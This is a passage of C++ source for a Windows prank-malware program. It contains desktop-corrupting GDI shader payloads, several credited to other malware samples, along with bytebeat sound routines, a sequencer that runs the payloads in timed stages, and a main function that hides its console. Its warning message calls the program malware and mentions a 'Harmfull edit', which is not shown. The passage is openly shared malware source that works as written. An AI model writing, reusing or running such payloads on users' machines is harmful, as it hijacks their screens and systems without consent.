    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);
    INT i = 0;
    DOUBLE angle = 0.f;
    while (true) {
        StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < ws; x++)
        {
            for (int y = 0; y < hs; y++)
            {
                int index = y * ws + x;
                int cx = (x - (ws / 2));
                int cy = (y - (hs / 2));
                int zx = cos(angle) * cx - sin(angle) * cy;
                int zy = sin(angle) * cx + cos(angle) * cy;
                int fx = (zx + i) ^ (zy + i);
                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        i++; angle += 0.01f;
        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
        Sleep(10);
    }
}
DWORD WINAPI Shader14_Circling2(LPVOID lpParam) {//from interknot.exe
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); int rgb = MAXDWORD64, v = 0, radius = 17.4f; double angle = 0;
    HDC hdc, hdcMem; HBITMAP hbm;
    for (int i = 0;; i++, i %= 6) {
        //if (!i) for (int c = 0; c < 21; c++)InvalidateRect(0, 0, 0);
        hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc); hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcMem, hbm);
        BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY); GetBitmapBits(hbm, w * h * 4, data);
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)  v = 1 + rand() % 6;
            rgb ^= (int)data + (x ^ y);
            ((BYTE*)(data + i))[v] = rgb;
        }
        float x = cos(angle) * radius, y = sin(angle) * radius;
        SetBitmapBits(hbm, w * h * 4, data); BitBlt(hdc, 0, 0, w, h, hdcMem, x, y, SRCCOPY);
        DeleteObject(hbm); DeleteObject(hdcMem);
        DeleteObject(hdc);
        Sleep(39);
        angle = fmod(angle + PI / radius, PI * radius);
    }
}
DWORD WINAPI Shader15_Rainble2(LPVOID lpParam) {//from ScreenDestroyer.scr,but I modified it.
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC dc = GetDC(NULL);
    HDC dcCopy = CreateCompatibleDC(dc);
    int ws = w / 4;
    int hs = h / 4;
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = ws;
    bmpi.bmiHeader.biHeight = hs;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(dcCopy, bmp);
    INT i = 0;
    FLOAT a = 5.0;
    FLOAT b = 3.0;
    SetStretchBltMode(dc, COLORONCOLOR);
    SetStretchBltMode(dcCopy, COLORONCOLOR);
    while (true) {
        StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);
        int randx = rand() % ws;
        int randy = rand() % hs;
        for (int x = 0; x < ws; x++)
        {
            for (int y = 0; y < hs; y++)
            {
                int index = y * ws + x;
                int cx = x - randx;
                int cy = y - randy;
                int zx = (cx * cx) / (a * a);
                int zy = (cy * cy) / (b * b);
                int fx = 128.0 + (128.0 * sin(sqrt(zx + zy) / 6.0));
                double distance = sqrt(zx + zy);
                HSL hsv = Colors::rgb2hsl(rgbquad[index]);
                hsv.h = fmod((distance / 8.0) + (x / (double)ws * 0.5) + (y / (double)hs * 0.3) + (i / 100.0) + (rand() % 100 / 1000.0), 1.0);
                rgbquad[index] = Colors::hsl2rgb(hsv);
            }
        }
        i++;
        StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);
        Sleep(100);
    }
}
DWORD WINAPI Shader16_NoName4(LPVOID lpParam) {//from Platinum.exe
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            if (i % h && rand() % 110)
                v = rand() % 2;
            *((BYTE*)data + 4 * i + v) = i;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
}
DWORD WINAPI Shader17_Wave(LPVOID lpParam) {
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    HDC hdc = GetDC(0), hcdc = CreateCompatibleDC(hdc);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32 };
    HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hcdc, hBitmap);
    float angle;
    for (;;) {
        hdc = GetDC(0);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            angle = 100 * cos(((float)y) / 100.f * PI);
            for (int x = 0; x < w; x++) {
                int tmp = x + angle;
                rgbScreen[y * w + x].rgb += tmp ^ y;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); DeleteDC(hdc);
        Sleep(10);
    }
}
DWORD WINAPI Shader18_Last(LPVOID lpParam) {//from Platinum.exe
    int time = GetTickCount();
    int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    for (int i = 0;; i++, i %= 3) {
        HDC desk = GetDC(NULL);
        HDC hdcdc = CreateCompatibleDC(desk);
        HBITMAP hbm = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hdcdc, hbm);
        BitBlt(hdcdc, 0, 0, w, h, desk, 0, 0, SRCCOPY);
        GetBitmapBits(hbm, w * h * 4, data);
        int v = 0;
        BYTE byte = 0;
        if ((GetTickCount() - time) > 60000)
            byte = rand() % 0xff;
        for (int i = 0; w * h > i; i++) {
            int x = i % w, y = i / h;
            if (i % h == 0 && rand() % 100 == 0)
                v = rand() % 1000;
            *((BYTE*)data + 4 * i + v) = (x ^ y) ^ byte;
        }
        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
         buffer[t] = static_cast<char>((int)(t / (double)(t >> 13 & t >> 14 & 7)) ^ t - t / 256 | 2 * (t >> 13 & t >> 14 & 3) * t & t >> 8 | 4 * t & t >> 6);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    //Sleep(10000);
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ t >> 10 * t & t >> 8);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * ((t >> 8) & 4 | (t >> 10) & 8));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4(){
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t >> 2 & t >> 7) | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {//made by myself
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 11025, 11025, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[11025 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 10 | t * t >> 5 + (t / 3 >> t / 3));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << 6 * t / 100 / 2) ^ (0 - (t >> 3 & 1)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t >> 9) | (t >> 7)) & 0x1e) * t & t * 2 | (int)(40000 / (double)(t & 0xfff)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t & t >> 6) + (t | t >> 8) + (t | t >> 7) + (t | t >> 9) | ~t >> 6) ^ (rand() % 48));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound9() {//from ShuiLongwxZoey,but I modified it.
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << (t >> 11 & 1)) + (t << (t >> 13 & 14)) + (t << (t >> 11 & 45)) | t * rand());
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound10() {//from ShuiLongwxZoey,but I modified it.
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * 11 >> (t * "1145pm"[t >> 11 & 2] * (t >> 11 | 10) >> 2) | rand() % 170);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(430 * (t * 5 & t >> 1 ^ t * 5 & t >> 11));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    static char buffer[44100 * 30];//I have no idea. :(
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t * 0.1) * cos(t * 1.001));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(64 + sin(t * 7 | ((int)(t / 2000) % 4)) * 50);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t + t >> t ^ t);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((int)tan(t >> 13 ^ t >> 9 - 1 ^ 1) % 13 * t) ^ (rand() % 48));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t ^ (t * (int)((-559030611 >> ((t >> 10) & 0xA)) & 0xC))) | (t >> 2));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound17() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((int)(t / 1e7 * t * t + t));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound18() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t >> 3 & 1) * t >> 3 ^ (int)(t / (double)128 * t)));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound19() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(2 * t & t >> 8 | 5 * t & t >> 7 | 9 * t & t >> 4 | 15 * t & t >> 4);
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound20() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = { 0 };
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(3 * t ^ t >> 6 | t | t << t * (rand()));
    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
void clean() {
    InvalidateRect(0, 0, 0);
    Sleep(100);
}
void SPtime() {
    Sleep(30000);
}
void runSP() {
    HANDLE cur1 = CreateThread(NULL, 0, Cursor1_Move, NULL, 0, NULL);
    Sleep(100);
    sound1();
    HANDLE th1 = CreateThread(NULL, 0, Payload1_Big, NULL, 0, NULL);
    SPtime();
    TerminateThread(th1, 0);
    clean();
    sound2();
    HANDLE th2 = CreateThread(NULL, 0, Shader1_ScreenColorfulError, NULL, 0, NULL);
    SPtime();
    TerminateThread(th2, 0);
    clean();
    sound3();
    HANDLE th3a = CreateThread(NULL, 0, Shader2_666_th3a, NULL, 0, NULL);
    HANDLE th3b = CreateThread(NULL, 0, Payload2_Icon1_th3b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th3a, 0);
    clean();
    sound4();
    HANDLE th4 = CreateThread(NULL, 0, Shader3_Gourd, NULL, 0, NULL);
    SPtime();
    TerminateThread(th4, 0);
    clean();
    sound5();
    HANDLE th5 = CreateThread(NULL, 0, Shader4_NoName, NULL, 0, NULL);
    SPtime();
    TerminateThread(th5, 0);
    TerminateThread(th3b, 0);
    clean();
    sound6();
    HANDLE th6a = CreateThread(NULL, 0, Shader5_GrayMove_th6a, NULL, 0, NULL);
    HANDLE th6b = CreateThread(NULL, 0, Payload3_Icon2_th6b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th6a, 0);
    clean();
    sound7();
    HANDLE th7a = CreateThread(NULL, 0, Shader6_Rainble_th7a, NULL, 0, NULL);
    HANDLE th7b = CreateThread(NULL, 0, Payload4_TextCross_th7b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th7a, 0);
    TerminateThread(th7b, 0);
    clean();
    sound8();
    HANDLE th8 = CreateThread(NULL, 0, Shader7_ScreenError, NULL, 0, NULL);
    SPtime();
    TerminateThread(th8, 0);
    clean();
    sound9();
    HANDLE th9 = CreateThread(NULL, 0, Shader8_Red, NULL, 0, NULL);
    SPtime();
    TerminateThread(th9, 0);
    TerminateThread(th6b, 0);
    clean();
    sound10();
    HANDLE th10a = CreateThread(NULL, 0, Payload5a_Shake, NULL, 0, NULL);
    HANDLE th10b = CreateThread(NULL, 0, Payload5b_Invert, NULL, 0, NULL);
    HANDLE th10c = CreateThread(NULL, 0, Payload5c_Icon3, NULL, 0, NULL);
    HANDLE th10d = CreateThread(NULL, 0, Payload5d_TextOut, NULL, 0, NULL);
    SPtime();
    TerminateThread(th10a, 0);
    TerminateThread(th10b, 0);
    clean();
    sound11();
    HANDLE th11 = CreateThread(NULL, 0, Shader9_NoName2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th11, 0);
    clean();
    sound12();
    HANDLE th12 = CreateThread(NULL, 0, Shader10_NoName3, NULL, 0, NULL);
    SPtime();
    TerminateThread(th12, 0);
    clean();
    sound13();
    HANDLE th13 = CreateThread(NULL, 0, Shader11_DarkRoom, NULL, 0, NULL);
    SPtime();
    TerminateThread(th13, 0);
    clean();
    sound14();
    HANDLE th14a = CreateThread(NULL, 0, Shader12_Gourd2_th14a, NULL, 0, NULL);
    HANDLE th14b = CreateThread(NULL, 0, Payload6_CircleZ_th14b, NULL, 0, NULL);
    SPtime();
    TerminateThread(th14a, 0);
    TerminateThread(th14b, 0);
    clean();
    sound15();
    HANDLE th15 = CreateThread(NULL, 0, Shader13_Circling, NULL, 0, NULL);
    SPtime();
    TerminateThread(th15, 0);
    clean();
    sound16();
    HANDLE th16 = CreateThread(NULL, 0, Shader14_Circling2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th16, 0);
    clean();
    sound17();
    HANDLE th17 = CreateThread(NULL, 0, Shader15_Rainble2, NULL, 0, NULL);
    SPtime();
    TerminateThread(th17, 0);
    TerminateThread(th10c, 0);
    TerminateThread(th10d, 0);
    clean();
    sound18();
    HANDLE th18 = CreateThread(NULL, 0, Shader16_NoName4, NULL, 0, NULL);
    SPtime();
    TerminateThread(th18, 0);
    TerminateThread(cur1, 0);
    clean();
    sound19();
    HANDLE th19 = CreateThread(NULL, 0, Shader17_Wave, NULL, 0, NULL);
    SPtime();
    TerminateThread(th19, 0);
    clean();
    sound20();
    HANDLE th20 = CreateThread(NULL, 0, Shader18_Last, NULL, 0, NULL);
    SPtime();
    TerminateThread(th20, 0);
    clean();
}
void InitDPI() {
    HMODULE hModUser32 = LoadLibraryW(L"user32.dll");
    BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
    if (SetProcessDPIAware)
        SetProcessDPIAware();
    FreeLibrary(hModUser32);
}
DWORD xs;
void SeedXorshift32(DWORD dwSeed) {
    xs = dwSeed;
}
int main() {
    InitDPI();
    srand(time(NULL));
    SeedXorshift32((DWORD)time(NULL));
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    LPCWSTR MessageTextFirst = L"Warning!!!\n\nDo you want to run me??I am a malware!Please do not run my Harmfull edit on your important computer if you want to live.I AM NOT TALKING A JOKE!!THIS IS REAL.And I must tell you something is quite important:DO NOT run my Harmfull edit on PUBLIC OR IMPORTANT COMPUTER!!If you want run my Harmfull edit,you can run my Harmfull edit on VM or not important computer.DO NOT COPY MY CODE IF YOU DO NOT WANT TO BE A GAY AND KILL YOUR PARANTS!!!!!!\n\nby github@uiui-sod  bilibili@uiui-YouAiYouAi";
